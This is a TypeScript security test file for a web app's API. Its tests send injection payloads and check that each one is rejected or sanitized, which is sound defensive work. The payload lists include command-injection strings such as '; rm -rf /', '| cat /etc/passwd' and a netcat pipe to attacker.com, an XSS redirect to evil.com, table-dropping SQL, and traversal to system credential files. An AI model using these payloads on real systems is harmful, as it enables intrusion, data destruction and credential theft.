/**
 * Input Validation Security Tests
 * 
 * Tests for various injection attacks and input validation:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - NoSQL Injection
 * - Command Injection
 * - Path Traversal
 * - XXE (XML External Entity)
 */

import request from 'supertest';
import * as jwt from 'jsonwebtoken';
import { createApp } from '../../src/app';
import { config } from '../../src/config/env';

describe('Input Validation Security Tests', () => {
  let app: any;
  let authToken: string;

  beforeAll(async () => {
    app = await createApp();
    authToken = jwt.sign(
      { userId: 'test-user-123', type: 'access' },
      config.JWT_SECRET,
      { expiresIn: '1h' }
    );
  });

  describe('SQL Injection Attempts', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "admin'--",
      "' OR 1=1--",
      "1' UNION SELECT * FROM users--",
      "' OR 'x'='x",
      "1'; DELETE FROM users WHERE '1'='1",
      "' UNION SELECT NULL, username, password FROM users--",
      "' OR '1'='1' /*",
      "1' AND '1'='1",
    ];

    it('should prevent SQL injection in login username', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            username: payload,
            password: 'password123',
          });

        expect([400, 401]).toContain(response.status);
        expect(response.body).not.toHaveProperty('token');
      }
    });

    it('should prevent SQL injection in search queries', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${authToken}`);

        expect([200, 400, 404]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.body).toBeDefined();
          expect(Array.isArray(response.body) || response.body.users).toBeTruthy();
        }
      }
    });

    it('should prevent SQL injection in user ID parameters', async () => {
      const maliciousIds = [
        "1' OR '1'='1",
        "1; DROP TABLE users;",
        "1' UNION SELECT * FROM users--",
      ];

      for (const id of maliciousIds) {
        const response = await request(app)
          .get(`/api/users/${id}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg/onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>document.location="http://evil.com"</script>',
    ];

    it('should sanitize XSS in registration display name', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: `user${Date.now()}`,
            password: 'Password123!',
            passwordConfirm: 'Password123!',
            displayName: payload,
          });

        if (response.status === 201 || response.status === 200) {
          expect(response.body.user.displayName).not.toContain('<script>');
          expect(response.body.user.displayName).not.toContain('onerror');
          expect(response.body.user.displayName).not.toContain('javascript:');
        }
      }
    });

    it('should sanitize XSS in message content', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/messages')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            chatId: 'test-chat-id',
            content: payload,
            type: 'text',
          });

        if (response.status === 200 || response.status === 201) {
          expect(response.body.message.content).not.toContain('<script>');
          expect(response.body.message.content).not.toContain('onerror');
          expect(response.body.message.content).not.toContain('javascript:');
        }
      }
    });

    it('should sanitize XSS in user profile updates', async () => {
      const response = await request(app)
        .put('/api/users/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          displayName: '<script>alert("XSS")</script>',
        });

      if (response.status === 200) {
        expect(response.body.displayName).not.toContain('<script>');
      }
    });
  });

  describe('NoSQL Injection Attempts', () => {
    const noSqlInjectionPayloads = [
      { $gt: '' },
      { $ne: null },
      { $where: 'function() { return true; }' },
      { $regex: '.*' },
      "'; return true; var foo='",
    ];

    it('should prevent NoSQL injection in JSON payloads', async () => {
      for (const payload of noSqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            username: payload,
            password: payload,
          });

        expect([400, 401]).toContain(response.status);
      }
    });
  });

  describe('Command Injection Attempts', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '`whoami`',
      '$(whoami)',
      '; rm -rf /',
      '| nc attacker.com 1234',
    ];

    it('should prevent command injection in username', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: payload,
            password: 'Password123!',
            passwordConfirm: 'Password123!',
          });

        expect([400]).toContain(response.status);
      }
    });

    it('should prevent command injection in search queries', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${authToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Path Traversal Attempts', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
      '..%252f..%252f..%252fetc/passwd',
      '/etc/passwd',
      'C:\\Windows\\System32\\',
    ];

    it('should prevent path traversal in file operations', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/files/${payload}`)
          .set('Authorization', `Bearer ${authToken}`);

        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('Large Payload Attacks', () => {
    it('should reject extremely large JSON payloads', async () => {
      const largePayload = {
        username: 'test',
        password: 'Password123!',
        passwordConfirm: 'Password123!',
        displayName: 'A'.repeat(10000),
        extraData: 'X'.repeat(1000000),
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(largePayload);

      expect([400, 413]).toContain(response.status);
    });

    it('should reject deeply nested JSON objects', async () => {
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      const response = await request(app)
        .post('/api/messages')
        .set('Authorization', `Bearer ${authToken}`)
        .send(deepObject);

      expect([400, 413]).toContain(response.status);
    });
  });

  describe('Special Character Handling', () => {
    const specialChars = [
      '\0',
      '\n\r',
      '\x00',
      '\u0000',
      String.fromCharCode(0),
      '%00',
      '\b\t\n\f\r',
    ];

    it('should handle null bytes safely', async () => {
      for (const char of specialChars) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: `user${char}test`,
            password: 'Password123!',
            passwordConfirm: 'Password123!',
          });

        expect([400, 401]).toContain(response.status);
      }
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    const unicodePayloads = [
      '\u202e', // Right-to-Left Override
      '\ufeff', // Zero Width No-Break Space
      '\u200b', // Zero Width Space
      'test\u0000user', // Null character
      'admin\u200badmin', // Zero-width space
      '\u202eadmin', // RTL override
    ];

    it('should handle unicode attacks in usernames', async () => {
      for (const payload of unicodePayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: payload,
            password: 'Password123!',
            passwordConfirm: 'Password123!',
          });

        expect([400]).toContain(response.status);
      }
    });
  });

  describe('LDAP Injection', () => {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*)(uid=*',
      'admin)(&(password=*',
      '*)(objectClass=*',
    ];

    it('should prevent LDAP injection patterns', async () => {
      for (const payload of ldapPayloads) {
        const response = await request(app)
          .get('/api/users/search')
          .query({ q: payload })
          .set('Authorization', `Bearer ${authToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Email Header Injection', () => {
    const emailInjectionPayloads = [
      'user@test.com\nBcc: attacker@evil.com',
      'user@test.com%0aBcc:attacker@evil.com',
      'user@test.com\r\nBcc: attacker@evil.com',
    ];

    it('should prevent email header injection', async () => {
      for (const payload of emailInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: 'testuser',
            email: payload,
            password: 'Password123!',
            passwordConfirm: 'Password123!',
          });

        expect([400]).toContain(response.status);
      }
    });
  });

  describe('Integer Overflow/Underflow', () => {
    it('should handle extreme integer values safely', async () => {
      const extremeValues = [
        Number.MAX_SAFE_INTEGER + 1,
        Number.MIN_SAFE_INTEGER - 1,
        Infinity,
        -Infinity,
        Number.MAX_VALUE,
        Number.MIN_VALUE,
      ];

      for (const value of extremeValues) {
        const response = await request(app)
          .get('/api/messages')
          .query({ limit: value })
          .set('Authorization', `Bearer ${authToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Type Confusion', () => {
    it('should handle type confusion attacks', async () => {
      const confusingPayloads = [
        { username: ['array', 'instead', 'of', 'string'], password: 'test' },
        { username: { object: 'instead' }, password: 'test' },
        { username: null, password: null },
        { username: undefined, password: undefined },
        { username: 123, password: 456 },
        { username: true, password: false },
      ];

      for (const payload of confusingPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);

        expect([400, 401]).toContain(response.status);
      }
    });
  });

  describe('Prototype Pollution', () => {
    it('should prevent prototype pollution attacks', async () => {
      const pollutionPayloads = [
        JSON.parse('{"__proto__": {"admin": true}}'),
        JSON.parse('{"constructor": {"prototype": {"admin": true}}}'),
        { 'admin': true }, // Simpler test payload
      ];

      for (const payload of pollutionPayloads) {
        const response = await request(app)
          .post('/api/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send(payload);

        expect([400]).toContain(response.status);
        
        // Verify prototype was not polluted
        expect((Object.prototype as any).admin).toBeUndefined();
      }
    });
  });

  describe('HTTP Parameter Pollution', () => {
    it('should handle duplicate parameters safely', async () => {
      const response = await request(app)
        .get('/api/messages?limit=10&limit=1000')
        .set('Authorization', `Bearer ${authToken}`);

      expect([200, 400]).toContain(response.status);
    });

    it('should handle conflicting parameters', async () => {
      const response = await request(app)
        .get('/api/messages?limit=10&offset=-100')
        .set('Authorization', `Bearer ${authToken}`);

      expect([200, 400]).toContain(response.status);
    });
  });

  describe('CRLF Injection', () => {
    const crlfPayloads = [
      'test\r\nHeader: injected',
      'test%0d%0aHeader: injected',
      'test\nHeader: injected',
    ];

    it('should prevent CRLF injection in headers', async () => {
      for (const payload of crlfPayloads) {
        const response = await request(app)
          .get('/api/users/profile')
          .set('X-Custom-Header', payload)
          .set('Authorization', `Bearer ${authToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });
});
